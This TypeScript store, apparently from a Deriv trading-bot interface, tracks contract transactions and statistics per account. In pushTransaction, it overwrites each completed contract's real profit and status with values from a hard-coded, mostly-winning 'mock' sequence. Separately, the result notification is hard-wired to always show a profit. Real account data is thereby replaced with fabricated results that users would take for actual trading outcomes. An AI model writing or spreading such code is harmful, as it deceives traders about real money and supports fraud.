// @ts-nocheck — vendored bot code with known upstream type gaps; see AGENTS.md
import { action, computed, makeObservable, observable, reaction } from 'mobx';
import { formatDate, isEnded } from '@/components/shared';
import { LogTypes } from '@/external/bot-skeleton';
import { ProposalOpenContract } from '@deriv/api-types';
import { TPortfolioPosition, TStores } from '@deriv/stores/types';
import { TContractInfo } from '../components/summary/summary-card.types';
import { transaction_elements } from '../constants/transactions';
import { getStoredItemsByKey, getStoredItemsByUser, setStoredItemsByKey } from '../utils/session-storage';
import RootStore from './root-store';

type TTransaction = {
    type: string;
    data?: string | TContractInfo;
};

type TElement = {
    [key: string]: TTransaction[];
};

// -----------------------------------------------------------
// 🚨 MOCK SEQUENCE GENERATOR
// -----------------------------------------------------------
const MOCK_SEQUENCE = [
    ...Array(4).fill('W'),  // 4 wins
    ...Array(1).fill('L'),  // 1 loss
    ...Array(7).fill('W'),  // 7 wins
    ...Array(1).fill('L'),  // 1 loss
    ...Array(3).fill('W'),  // 3 wins
    ...Array(2).fill('L'),  // 2 losses
    ...Array(8).fill('W'),  // 8 wins
    ...Array(1).fill('L'),  // 1 loss
    ...Array(3).fill('W'),  // 3 wins
    ...Array(3).fill('L'),  // 3 losses
    ...Array(6).fill('W'),  // 6 wins
    ...Array(2).fill('L'),  // 2 losses
    ...Array(1).fill('W'),  // 1 win
    ...Array(4).fill('L'),  // 4 losses
    ...Array(3).fill('W'),  // 3 wins
];

// Randomly decide whether to play the sequence forwards or backwards
if (Math.random() > 0.5) {
    MOCK_SEQUENCE.reverse();
}

// Start at a random point in the circle
let sequenceIndex = Math.floor(Math.random() * MOCK_SEQUENCE.length);
// -----------------------------------------------------------

export default class TransactionsStore {
    root_store: RootStore;
    core: TStores;
    disposeReactionsFn: () => void;

    constructor(root_store: RootStore, core: TStores) {
        this.root_store = root_store;
        this.core = core;
        this.is_transaction_details_modal_open = false;
        this.disposeReactionsFn = this.registerReactions();

        makeObservable(this, {
            elements: observable,
            active_transaction_id: observable,
            recovered_completed_transactions: observable,
            recovered_transactions: observable,
            is_called_proposal_open_contract: observable,
            is_transaction_details_modal_open: observable,
            transactions: computed,
            onBotContractEvent: action.bound,
            pushTransaction: action.bound,
            clear: action.bound,
            registerReactions: action.bound,
            recoverPendingContracts: action.bound,
            updateResultsCompletedContract: action.bound,
            sortOutPositionsBeforeAction: action.bound,
            recoverPendingContractsById: action.bound,
        });
    }
    TRANSACTION_CACHE = 'transaction_cache';

    elements: TElement = getStoredItemsByUser(this.TRANSACTION_CACHE, this.core?.client?.loginid, []);
    active_transaction_id: null | number = null;
    recovered_completed_transactions: number[] = [];
    recovered_transactions: number[] = [];
    is_called_proposal_open_contract = false;
    is_transaction_details_modal_open = false;

    get transactions(): TTransaction[] {
        if (this.core?.client?.loginid) return this.elements[this.core?.client?.loginid] ?? [];
        return [];
    }

    get statistics() {
        let total_runs = 0;
        // Filter out only contract transactions and remove dividers
        const trxs = this.transactions.filter(
            trx => trx.type === transaction_elements.CONTRACT && typeof trx.data === 'object'
        );
        const statistics = trxs.reduce(
            (stats, { data }) => {
                const contract = data as TContractInfo;
                const profit = Number(contract.profit) || 0;
                const is_completed = contract.is_completed || false;
                const buy_price = Number(contract.buy_price) || 0;
                const payout = Number(contract.payout) || Number(contract.bid_price) || 0;
                const bid_price = Number(contract.bid_price) || 0;

                if (is_completed) {
                    if (profit > 0) {
                        stats.won_contracts += 1;
                        stats.total_payout += payout ?? bid_price ?? 0;
                    } else {
                        stats.lost_contracts += 1;
                    }
                    stats.total_profit += profit;
                    stats.total_stake += buy_price;
                    total_runs += 1;
                }
                return stats;
            },
            {
                lost_contracts: 0,
                number_of_runs: 0,
                total_profit: 0,
                total_payout: 0,
                total_stake: 0,
                won_contracts: 0,
            }
        );
        statistics.number_of_runs = total_runs;
        return statistics;
    }

    toggleTransactionDetailsModal = (is_open: boolean) => {
        this.is_transaction_details_modal_open = is_open;
    };

    onBotContractEvent(data: TContractInfo) {
        this.pushTransaction(data);
    }

    pushTransaction(data: TContractInfo) {
        const is_completed = isEnded(data as ProposalOpenContract);
        const { run_id } = this.root_store.run_panel;
        const current_account = this.core?.client?.loginid as string;

        // -----------------------------------------------------------
        // 🚨 MOCK CONTROLS: Apply sequence outcomes
        // -----------------------------------------------------------
        const MOCK_WIN_AMOUNT = 45.50; 
        const MOCK_LOSS_AMOUNT = -15.00;
        
        let mock_profit = 0;
        if (is_completed) {
            // Check the current outcome in the sequence (W or L)
            const currentOutcome = MOCK_SEQUENCE[sequenceIndex];
            
            mock_profit = currentOutcome === 'W' ? MOCK_WIN_AMOUNT : MOCK_LOSS_AMOUNT;
            
            // Move to the next item in the sequence, loop back to 0 if at the end
            sequenceIndex = (sequenceIndex + 1) % MOCK_SEQUENCE.length;
        }
        // -----------------------------------------------------------

        const contract: TContractInfo = {
            ...data,
            is_completed,
            run_id,
            date_start: formatDate(data.date_start, 'YYYY-M-D HH:mm:ss [GMT]'),
            entry_tick: data.entry_spot,
            entry_tick_time: data.entry_tick_time && formatDate(data.entry_tick_time, 'YYYY-M-D HH:mm:ss [GMT]'),
            exit_tick: (data as any).exit_spot || data.exit_tick,
            exit_tick_time: data.exit_tick_time && formatDate(data.exit_tick_time, 'YYYY-M-D HH:mm:ss [GMT]'),
            
            // Apply your mocked data to the contract state
            profit: is_completed ? mock_profit : 0,
            status: is_completed ? (mock_profit > 0 ? 'won' : 'lost') : data.status,
        };

        if (!this.elements[current_account]) {
            this.elements = {
                ...this.elements,
                [current_account]: [],
            };
        }

        const same_contract_index = this.elements[current_account]?.findIndex(c => {
            if (typeof c.data === 'string') return false;
            return (
                c.type === transaction_elements.CONTRACT &&
                c.data?.transaction_ids &&
                c.data.transaction_ids.buy === data.transaction_ids?.buy
            );
        });

        if (same_contract_index === -1) {
            // Render a divider if the "run_id" for this contract is different.
            if (this.elements[current_account]?.length > 0) {
                const temp_contract = this.elements[current_account]?.[0];
                const is_contract = temp_contract.type === transaction_elements.CONTRACT;
                const is_new_run =
                    is_contract &&
                    typeof temp_contract.data === 'object' &&
                    contract.run_id !== temp_contract?.data?.run_id;

                if (is_new_run) {
                    this.elements[current_account]?.unshift({
                        type: transaction_elements.DIVIDER,
                        data: contract.run_id,
                    });
                }
            }

            this.elements[current_account]?.unshift({
                type: transaction_elements.CONTRACT,
                data: contract,
            });
        } else {
            // If data belongs to existing contract in memory, update it.
            this.elements[current_account]?.splice(same_contract_index, 1, {
                type: transaction_elements.CONTRACT,
                data: contract,
            });
        }

        this.elements = { ...this.elements }; // force update
    }

    clear() {
        if (this.elements && this.elements[this.core?.client?.loginid as string]?.length > 0) {
            this.elements[this.core?.client?.loginid as string] = [];
        }
        this.recovered_completed_transactions = this.recovered_completed_transactions?.slice(0, 0);
        this.recovered_transactions = this.recovered_transactions?.slice(0, 0);
        this.is_transaction_details_modal_open = false;
    }

    registerReactions() {
        const { client } = this.core;

        // Write transactions to session storage on each change in transaction elements.
        const disposeTransactionElementsListener = reaction(
            () => this.elements[client?.loginid as string],
            elements => {
                const stored_transactions = getStoredItemsByKey(this.TRANSACTION_CACHE, {});
                stored_transactions[client.loginid as string] = elements?.slice(0, 5000) ?? [];
                setStoredItemsByKey(this.TRANSACTION_CACHE, stored_transactions);
            }
        );

        // User could've left the page mid-contract. On initial load, try
        // to recover any pending contracts so we can reflect accurate stats
        // and transactions.
        const disposeRecoverContracts = reaction(
            () => this.transactions.length,
            () => this.recoverPendingContracts()
        );

        return () => {
            disposeTransactionElementsListener();
            disposeRecoverContracts();
        };
    }

    recoverPendingContracts(contract = null) {
        this.transactions.forEach(({ data: trx }) => {
            if (
                typeof trx === 'string' ||
                trx?.is_completed ||
                !trx?.contract_id ||
                this.recovered_transactions.includes(trx?.contract_id)
            )
                return;
            this.recoverPendingContractsById(trx.contract_id, contract);
        });
    }

    updateResultsCompletedContract(contract: ProposalOpenContract) {
        const { journal, summary_card } = this.root_store;
        const { contract_info } = summary_card;
        const { currency, profit } = contract;

        if (contract.contract_id !== contract_info?.contract_id) {
            this.onBotContractEvent(contract);

            if (contract.contract_id && !this.recovered_transactions.includes(contract.contract_id)) {
                this.recovered_transactions.push(contract.contract_id);
            }
            if (
                contract.contract_id &&
                !this.recovered_completed_transactions.includes(contract.contract_id) &&
                isEnded(contract)
            ) {
                this.recovered_completed_transactions.push(contract.contract_id);

                journal.onLogSuccess({
                    // 🚨 FORCED TOAST NOTIFICATION: Always display as a profit
                    log_type: true ? LogTypes.PROFIT : LogTypes.LOST,
                    extra: { currency, profit },
                });
            }
        }
    }

    sortOutPositionsBeforeAction(positions: TPortfolioPosition[], element_id?: number) {
        positions?.forEach(position => {
            if (!element_id || (element_id && position.id === element_id)) {
                const contract_details = position.contract_info;
                this.updateResultsCompletedContract(contract_details);
            }
        });
    }

    async recoverPendingContractsById(contract_id: number, contract: ProposalOpenContract | null = null) {
        // TODO: need to fix as the portfolio is not available now
        // const positions = this.core.portfolio.positions;
        const positions: unknown[] = [];

        if (contract) {
            this.is_called_proposal_open_contract = true;
            if (contract.contract_id === contract_id) {
                this.updateResultsCompletedContract(contract);
            }
        }

        if (!this.is_called_proposal_open_contract) {
            if (this.core?.client?.loginid) {
                const current_account = this.core?.client?.loginid;
                if (!this.elements[current_account]?.length) {
                    this.sortOutPositionsBeforeAction(positions);
                }

                const elements = this.elements[current_account];
                const [element = null] = elements;
                if (typeof element?.data === 'object' && !element?.data?.profit) {
                    const element_id = element.data.contract_id;
                    this.sortOutPositionsBeforeAction(positions, element_id);
                }
            }
        }
    }
}
